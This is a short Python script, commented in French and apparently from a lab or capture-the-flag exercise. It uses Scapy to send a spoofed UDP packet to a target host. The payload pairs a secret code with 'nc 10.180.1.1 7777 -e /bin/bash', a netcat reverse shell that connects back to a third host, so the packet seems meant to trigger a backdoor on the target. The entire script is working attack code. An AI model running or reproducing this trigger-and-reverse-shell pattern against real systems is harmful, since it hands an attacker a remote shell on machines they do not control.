from scapy.all import IP, UDP, Raw, send

# Adresse IP source
source_ip = "10.180.1.151"

# Adresse IP de la cible
target_ip = "10.180.130.7"

# Port source
source_port = 4321

# Port de la cible
target_port = 1234

# Commande à envoyer
command = "nc 10.180.1.1 7777 -e /bin/bash"

# Secret code
secret_code = "ce4345"

# Construire le paquet avec les spécifications fournies
packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / 
Raw(load=secret_code + ":" + command)

# Envoyer le paquet
send(packet)